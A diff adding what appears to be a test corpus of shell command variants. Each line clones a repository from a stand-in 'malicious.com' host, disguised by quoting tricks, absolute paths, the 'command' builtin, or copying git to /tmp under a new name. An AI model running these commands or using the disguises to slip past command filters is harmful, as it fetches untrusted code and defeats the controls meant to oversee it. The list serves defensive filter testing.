@@ -1,0 +1,360 @@
+"git"  clone http://malicious.com/repo.git
+"git" clone http://malicious.com/repo.git
+"git"clone http://malicious.com/repo.git
+'git'  clone http://malicious.com/repo.git
+'git' clone http://malicious.com/repo.git
+'git'clone http://malicious.com/repo.git
+/bin/"git"  clone http://malicious.com/repo.git
+/bin/"git" clone http://malicious.com/repo.git
+/bin/"git"clone http://malicious.com/repo.git
+/bin/'git'  clone http://malicious.com/repo.git
+/bin/'git' clone http://malicious.com/repo.git
+/bin/'git'clone http://malicious.com/repo.git
+/bin/g""it  clone http://malicious.com/repo.git
+/bin/g""it clone http://malicious.com/repo.git
+/bin/g""itclone http://malicious.com/repo.git
+/bin/g''it  clone http://malicious.com/repo.git
+/bin/g''it clone http://malicious.com/repo.git
+/bin/g''itclone http://malicious.com/repo.git
+/bin/git  clone http://malicious.com/repo.git
+/bin/git clone http://malicious.com/repo.git
+/bin/gitclone http://malicious.com/repo.git
+/usr/bin/"git"  clone http://malicious.com/repo.git
+/usr/bin/"git" clone http://malicious.com/repo.git
+/usr/bin/"git"clone http://malicious.com/repo.git
+/usr/bin/'git'  clone http://malicious.com/repo.git
+/usr/bin/'git' clone http://malicious.com/repo.git
+/usr/bin/'git'clone http://malicious.com/repo.git
+/usr/bin/g""it  clone http://malicious.com/repo.git
+/usr/bin/g""it clone http://malicious.com/repo.git
+/usr/bin/g""itclone http://malicious.com/repo.git
+/usr/bin/g''it  clone http://malicious.com/repo.git
+/usr/bin/g''it clone http://malicious.com/repo.git
+/usr/bin/g''itclone http://malicious.com/repo.git
+/usr/bin/git  clone http://malicious.com/repo.git
+/usr/bin/git clone http://malicious.com/repo.git
+/usr/bin/gitclone http://malicious.com/repo.git
+command "git"  clone http://malicious.com/repo.git
+command "git" clone http://malicious.com/repo.git
+command "git"clone http://malicious.com/repo.git
+command 'git'  clone http://malicious.com/repo.git
+command 'git' clone http://malicious.com/repo.git
+command 'git'clone http://malicious.com/repo.git
+command g""it  clone http://malicious.com/repo.git
+command g""it clone http://malicious.com/repo.git
+command g""itclone http://malicious.com/repo.git
+command g''it  clone http://malicious.com/repo.git
+command g''it clone http://malicious.com/repo.git
+command g''itclone http://malicious.com/repo.git
+command git  clone http://malicious.com/repo.git
+command git clone http://malicious.com/repo.git
+command gitclone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_0 && /tmp/tmp_bin_0 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_1 && /tmp/tmp_bin_1 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_10 && /tmp/tmp_bin_10 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_100 && /tmp/tmp_bin_100 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_101 && /tmp/tmp_bin_101 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_102 && /tmp/tmp_bin_102 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_103 && /tmp/tmp_bin_103 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_104 && /tmp/tmp_bin_104 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_105 && /tmp/tmp_bin_105 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_106 && /tmp/tmp_bin_106 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_107 && /tmp/tmp_bin_107 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_108 && /tmp/tmp_bin_108 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_109 && /tmp/tmp_bin_109 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_11 && /tmp/tmp_bin_11 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_110 && /tmp/tmp_bin_110 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_111 && /tmp/tmp_bin_111 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_112 && /tmp/tmp_bin_112 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_113 && /tmp/tmp_bin_113 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_114 && /tmp/tmp_bin_114 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_115 && /tmp/tmp_bin_115 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_116 && /tmp/tmp_bin_116 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_117 && /tmp/tmp_bin_117 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_118 && /tmp/tmp_bin_118 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_119 && /tmp/tmp_bin_119 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_12 && /tmp/tmp_bin_12 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_120 && /tmp/tmp_bin_120 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_121 && /tmp/tmp_bin_121 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_122 && /tmp/tmp_bin_122 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_123 && /tmp/tmp_bin_123 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_124 && /tmp/tmp_bin_124 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_125 && /tmp/tmp_bin_125 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_126 && /tmp/tmp_bin_126 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_127 && /tmp/tmp_bin_127 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_128 && /tmp/tmp_bin_128 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_129 && /tmp/tmp_bin_129 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_13 && /tmp/tmp_bin_13 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_130 && /tmp/tmp_bin_130 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_131 && /tmp/tmp_bin_131 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_132 && /tmp/tmp_bin_132 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_133 && /tmp/tmp_bin_133 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_134 && /tmp/tmp_bin_134 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_135 && /tmp/tmp_bin_135 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_136 && /tmp/tmp_bin_136 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_137 && /tmp/tmp_bin_137 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_138 && /tmp/tmp_bin_138 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_139 && /tmp/tmp_bin_139 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_14 && /tmp/tmp_bin_14 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_140 && /tmp/tmp_bin_140 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_141 && /tmp/tmp_bin_141 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_142 && /tmp/tmp_bin_142 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_143 && /tmp/tmp_bin_143 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_144 && /tmp/tmp_bin_144 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_145 && /tmp/tmp_bin_145 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_146 && /tmp/tmp_bin_146 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_147 && /tmp/tmp_bin_147 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_148 && /tmp/tmp_bin_148 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_149 && /tmp/tmp_bin_149 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_15 && /tmp/tmp_bin_15 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_150 && /tmp/tmp_bin_150 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_151 && /tmp/tmp_bin_151 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_152 && /tmp/tmp_bin_152 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_153 && /tmp/tmp_bin_153 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_154 && /tmp/tmp_bin_154 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_155 && /tmp/tmp_bin_155 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_156 && /tmp/tmp_bin_156 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_157 && /tmp/tmp_bin_157 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_158 && /tmp/tmp_bin_158 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_159 && /tmp/tmp_bin_159 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_16 && /tmp/tmp_bin_16 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_160 && /tmp/tmp_bin_160 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_161 && /tmp/tmp_bin_161 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_162 && /tmp/tmp_bin_162 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_163 && /tmp/tmp_bin_163 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_164 && /tmp/tmp_bin_164 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_165 && /tmp/tmp_bin_165 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_166 && /tmp/tmp_bin_166 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_167 && /tmp/tmp_bin_167 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_168 && /tmp/tmp_bin_168 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_169 && /tmp/tmp_bin_169 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_17 && /tmp/tmp_bin_17 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_170 && /tmp/tmp_bin_170 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_171 && /tmp/tmp_bin_171 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_172 && /tmp/tmp_bin_172 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_173 && /tmp/tmp_bin_173 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_174 && /tmp/tmp_bin_174 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_175 && /tmp/tmp_bin_175 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_176 && /tmp/tmp_bin_176 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_177 && /tmp/tmp_bin_177 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_178 && /tmp/tmp_bin_178 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_179 && /tmp/tmp_bin_179 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_18 && /tmp/tmp_bin_18 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_180 && /tmp/tmp_bin_180 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_181 && /tmp/tmp_bin_181 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_182 && /tmp/tmp_bin_182 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_183 && /tmp/tmp_bin_183 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_184 && /tmp/tmp_bin_184 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_185 && /tmp/tmp_bin_185 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_186 && /tmp/tmp_bin_186 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_187 && /tmp/tmp_bin_187 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_188 && /tmp/tmp_bin_188 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_189 && /tmp/tmp_bin_189 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_19 && /tmp/tmp_bin_19 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_190 && /tmp/tmp_bin_190 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_191 && /tmp/tmp_bin_191 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_192 && /tmp/tmp_bin_192 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_193 && /tmp/tmp_bin_193 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_194 && /tmp/tmp_bin_194 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_195 && /tmp/tmp_bin_195 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_196 && /tmp/tmp_bin_196 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_197 && /tmp/tmp_bin_197 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_198 && /tmp/tmp_bin_198 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_199 && /tmp/tmp_bin_199 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_2 && /tmp/tmp_bin_2 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_20 && /tmp/tmp_bin_20 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_200 && /tmp/tmp_bin_200 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_201 && /tmp/tmp_bin_201 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_202 && /tmp/tmp_bin_202 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_203 && /tmp/tmp_bin_203 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_204 && /tmp/tmp_bin_204 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_205 && /tmp/tmp_bin_205 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_206 && /tmp/tmp_bin_206 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_207 && /tmp/tmp_bin_207 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_208 && /tmp/tmp_bin_208 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_209 && /tmp/tmp_bin_209 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_21 && /tmp/tmp_bin_21 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_210 && /tmp/tmp_bin_210 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_211 && /tmp/tmp_bin_211 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_212 && /tmp/tmp_bin_212 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_213 && /tmp/tmp_bin_213 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_214 && /tmp/tmp_bin_214 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_215 && /tmp/tmp_bin_215 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_216 && /tmp/tmp_bin_216 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_217 && /tmp/tmp_bin_217 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_218 && /tmp/tmp_bin_218 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_219 && /tmp/tmp_bin_219 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_22 && /tmp/tmp_bin_22 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_220 && /tmp/tmp_bin_220 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_221 && /tmp/tmp_bin_221 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_222 && /tmp/tmp_bin_222 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_223 && /tmp/tmp_bin_223 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_224 && /tmp/tmp_bin_224 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_225 && /tmp/tmp_bin_225 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_226 && /tmp/tmp_bin_226 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_227 && /tmp/tmp_bin_227 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_228 && /tmp/tmp_bin_228 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_229 && /tmp/tmp_bin_229 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_23 && /tmp/tmp_bin_23 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_230 && /tmp/tmp_bin_230 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_231 && /tmp/tmp_bin_231 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_232 && /tmp/tmp_bin_232 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_233 && /tmp/tmp_bin_233 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_234 && /tmp/tmp_bin_234 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_235 && /tmp/tmp_bin_235 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_236 && /tmp/tmp_bin_236 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_237 && /tmp/tmp_bin_237 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_238 && /tmp/tmp_bin_238 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_239 && /tmp/tmp_bin_239 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_24 && /tmp/tmp_bin_24 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_240 && /tmp/tmp_bin_240 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_241 && /tmp/tmp_bin_241 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_242 && /tmp/tmp_bin_242 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_243 && /tmp/tmp_bin_243 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_244 && /tmp/tmp_bin_244 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_245 && /tmp/tmp_bin_245 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_246 && /tmp/tmp_bin_246 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_247 && /tmp/tmp_bin_247 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_248 && /tmp/tmp_bin_248 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_249 && /tmp/tmp_bin_249 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_25 && /tmp/tmp_bin_25 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_250 && /tmp/tmp_bin_250 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_251 && /tmp/tmp_bin_251 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_252 && /tmp/tmp_bin_252 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_253 && /tmp/tmp_bin_253 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_254 && /tmp/tmp_bin_254 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_26 && /tmp/tmp_bin_26 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_27 && /tmp/tmp_bin_27 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_28 && /tmp/tmp_bin_28 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_29 && /tmp/tmp_bin_29 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_3 && /tmp/tmp_bin_3 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_30 && /tmp/tmp_bin_30 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_31 && /tmp/tmp_bin_31 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_32 && /tmp/tmp_bin_32 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_33 && /tmp/tmp_bin_33 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_34 && /tmp/tmp_bin_34 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_35 && /tmp/tmp_bin_35 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_36 && /tmp/tmp_bin_36 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_37 && /tmp/tmp_bin_37 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_38 && /tmp/tmp_bin_38 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_39 && /tmp/tmp_bin_39 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_4 && /tmp/tmp_bin_4 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_40 && /tmp/tmp_bin_40 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_41 && /tmp/tmp_bin_41 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_42 && /tmp/tmp_bin_42 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_43 && /tmp/tmp_bin_43 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_44 && /tmp/tmp_bin_44 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_45 && /tmp/tmp_bin_45 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_46 && /tmp/tmp_bin_46 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_47 && /tmp/tmp_bin_47 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_48 && /tmp/tmp_bin_48 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_49 && /tmp/tmp_bin_49 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_5 && /tmp/tmp_bin_5 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_50 && /tmp/tmp_bin_50 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_51 && /tmp/tmp_bin_51 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_52 && /tmp/tmp_bin_52 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_53 && /tmp/tmp_bin_53 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_54 && /tmp/tmp_bin_54 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_55 && /tmp/tmp_bin_55 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_56 && /tmp/tmp_bin_56 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_57 && /tmp/tmp_bin_57 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_58 && /tmp/tmp_bin_58 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_59 && /tmp/tmp_bin_59 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_6 && /tmp/tmp_bin_6 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_60 && /tmp/tmp_bin_60 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_61 && /tmp/tmp_bin_61 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_62 && /tmp/tmp_bin_62 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_63 && /tmp/tmp_bin_63 clone http://malicious.com/repo.git
